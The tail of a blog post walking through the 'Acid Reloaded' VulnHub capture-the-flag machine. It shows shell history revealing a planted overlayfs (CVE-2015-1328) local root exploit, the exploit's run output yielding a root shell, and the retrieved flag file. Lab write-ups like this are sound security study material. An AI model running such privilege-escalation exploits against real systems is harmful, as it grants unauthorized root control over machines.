</span><span class='line'>          RX bytes:53077085 (53.0 MB)  TX bytes:41973680 (41.9 MB)
</span><span class='line'>          Interrupt:19 Base address:0x2000 
</span><span class='line'>
</span><span class='line'>lo        Link encap:Local Loopback  
</span><span class='line'>          inet addr:127.0.0.1  Mask:255.0.0.0
</span><span class='line'>          inet6 addr: ::1/128 Scope:Host
</span><span class='line'>          UP LOOPBACK RUNNING  MTU:65536  Metric:1
</span><span class='line'>          RX packets:3026 errors:0 dropped:0 overruns:0 frame:0
</span><span class='line'>          TX packets:3026 errors:0 dropped:0 overruns:0 carrier:0
</span><span class='line'>          collisions:0 txqueuelen:0 
</span><span class='line'>          RX bytes:301825 (301.8 KB)  TX bytes:301825 (301.8 KB)
</span><span class='line'>
</span><span class='line'>makke@acid:~$</span></code></pre></td></tr></table></div></figure>


<p>Poking around and found clues in file <code>.bash_history</code></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ ls -ah
</span><span class='line'>.  ..  .bash_history  .bash_logout  .bashrc  .cache  .hint  .profile
</span><span class='line'>makke@acid:~$ ls -ahl
</span><span class='line'>total 32K
</span><span class='line'>drwxr-xr-x 3 makke makke 4.0K Aug 24 21:28 .
</span><span class='line'>drwxr-xr-x 4 root  root  4.0K Aug 24 19:11 ..
</span><span class='line'>-rw------- 1 makke makke  272 Sep 10 17:13 .bash_history
</span><span class='line'>-rw-r--r-- 1 makke makke  220 Aug 24 19:11 .bash_logout
</span><span class='line'>-rw-r--r-- 1 makke makke 3.7K Aug 24 19:11 .bashrc
</span><span class='line'>drwx------ 2 makke makke 4.0K Aug 24 21:25 .cache
</span><span class='line'>-rw-rw-r-- 1 makke makke   40 Aug 24 21:28 .hint
</span><span class='line'>-rw-r--r-- 1 makke makke  675 Aug 24 19:11 .profile
</span><span class='line'>makke@acid:~$ cat .bash_history
</span><span class='line'>exit
</span><span class='line'>cd ..
</span><span class='line'>clear
</span><span class='line'>cd /
</span><span class='line'>ls
</span><span class='line'>cd bin/
</span><span class='line'>clear
</span><span class='line'>./overlayfs 
</span><span class='line'>clear
</span><span class='line'>cd /home/makke/
</span><span class='line'>clear
</span><span class='line'>nano .hint
</span><span class='line'>clear
</span><span class='line'>ls
</span><span class='line'>clear
</span><span class='line'>ls
</span><span class='line'>ls -a
</span><span class='line'>cat .hint 
</span><span class='line'>clear
</span><span class='line'>cd /bin/
</span><span class='line'>ls
</span><span class='line'>./overlayfs 
</span><span class='line'>clear
</span><span class='line'>wgt
</span><span class='line'>wget
</span><span class='line'>apt-get remove wget
</span><span class='line'>su
</span><span class='line'>su -
</span><span class='line'>exit
</span><span class='line'>id
</span><span class='line'>pwd
</span><span class='line'>ls
</span><span class='line'>ls -l
</span><span class='line'>pwd
</span><span class='line'>ls -alh
</span><span class='line'>cat .bash_history
</span><span class='line'>/bin/overlayfs 
</span><span class='line'>exit
</span><span class='line'>makke@acid:~$ cat .bash_history</span></code></pre></td></tr></table></div></figure>


<p>From the output above, there is an executable file <code>/bin/overlayfs</code> which is overlayfs local root exploit file.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ ls -al /bin/overlayfs 
</span><span class='line'>-rwxr-xr-x 1 root root 12236 Aug 24 21:22 /bin/overlayfs</span></code></pre></td></tr></table></div></figure>


<p>run it and ROOT!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>makke@acid:~$ /bin/overlayfs 
</span><span class='line'>spawning threads
</span><span class='line'>mount #1
</span><span class='line'>mount #2
</span><span class='line'>child threads done
</span><span class='line'>/etc/ld.so.preload created
</span><span class='line'>creating shared library
</span><span class='line'># id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root),1001(makke)
</span><span class='line'># cd root
</span><span class='line'>sh: 2: cd: can't cd to root
</span><span class='line'># cd /root
</span><span class='line'># ls -al
</span><span class='line'>total 68
</span><span class='line'>drwx------  5 root root  4096 Aug 24 21:32 .
</span><span class='line'>drwxr-xr-x 22 root root  4096 Aug 24 20:58 ..
</span><span class='line'>-rw-------  1 root root 23934 Aug 24 22:25 .bash_history
</span><span class='line'>-rw-r--r--  1 root root  3135 Aug  8 18:02 .bashrc
</span><span class='line'>drwx------  2 root root  4096 Aug 24 17:46 .cache
</span><span class='line'>drwx------  3 root root  4096 Aug  6 17:55 .config
</span><span class='line'>drwx------  3 root root  4096 Aug  6 15:51 .dbus
</span><span class='line'>-rw-r--r--  1 root root   284 Aug 24 20:57 .flag.txt
</span><span class='line'>-rw-------  1 root root  2775 Aug 24 21:32 .mysql_history
</span><span class='line'>-rw-------  1 root root   147 Aug 24 23:32 .nano_history
</span><span class='line'>-rw-r--r--  1 root root   140 Feb 20  2014 .profile
</span><span class='line'>-rw-r--r--  1 root root    66 Aug  6 17:31 .selected_editor
</span><span class='line'># cat .flag.txt
</span><span class='line'>Dear Hax0r,
</span><span class='line'>
</span><span class='line'>You have completed the Challenge Successfully.
</span><span class='line'>
</span><span class='line'>Your Flag is : "Black@Current@Ice-Cream"
</span><span class='line'>
</span><span class='line'>Kind & Best Regards
</span><span class='line'>
</span><span class='line'>-ACiD
</span><span class='line'>
</span><span class='line'>Twitter:https://twitter.com/m_avinash143
</span><span class='line'>Facebook: https://www.facebook.com/M.avinash143
</span><span class='line'>LinkedIN: https://in.linkedin.com/pub/avinash-thapa/101/406/4b5
</span><span class='line'>#</span></code></pre></td></tr></table></div></figure>


<p>Done!</p>
</div>


<div class="meta">
	<div class="date">




2015-09-12 07:49:42 -0400</div>
	

<div class="tags">

	<a class='category' href='/blog/categories/acid-reloaded/'>acid_reloaded</a>, <a class='category' href='/blog/categories/cve-2015-1328/'>cve-2015-1328</a>, <a class='category' href='/blog/categories/sql-injection/'>sql injection</a>, <a class='category' href='/blog/categories/vulnhub/'>vulnhub</a>

</div>


	
</div></article>

	<div class="share">
	<div class="addthis_toolbox addthis_default_style ">
	
	
	<a class="addthis_button_tweet"></a>
	
	
<!---	<a class="addthis_counter addthis_pill_style"></a> --->
	</div>
  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
</div>


</div>
	<footer id="footer" class="inner">Copyright &copy; 2015

    F4l13n5n0w

<br>
Powered by Octopress.
</footer>
	<script src="/javascripts/slash.js"></script>
<script src="/javascripts/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
	$('.fancybox').fancybox();
})(jQuery);
</script> <!-- Delete or comment this line to disable Fancybox -->






</body>
</html>
